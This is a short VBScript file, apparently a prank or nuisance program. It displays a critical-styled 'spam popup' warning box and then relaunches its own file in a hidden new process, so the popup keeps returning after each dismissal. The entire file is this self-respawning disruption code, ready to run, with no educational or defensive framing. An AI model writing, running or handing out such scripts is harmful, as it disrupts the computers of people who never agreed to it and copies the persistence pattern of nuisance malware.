' Create a Shell object
Set shell = CreateObject("WScript.Shell")

' Define the script name
Dim scriptName
scriptName = WScript.ScriptFullName

' Show a critical message box
MsgBox "Warning: This is a spam popup!", vbCritical, "Spam Alert"

' Run the script in a new process
shell.Run "wscript """ & scriptName & """", 0, False

' Clean up
Set shell = Nothing
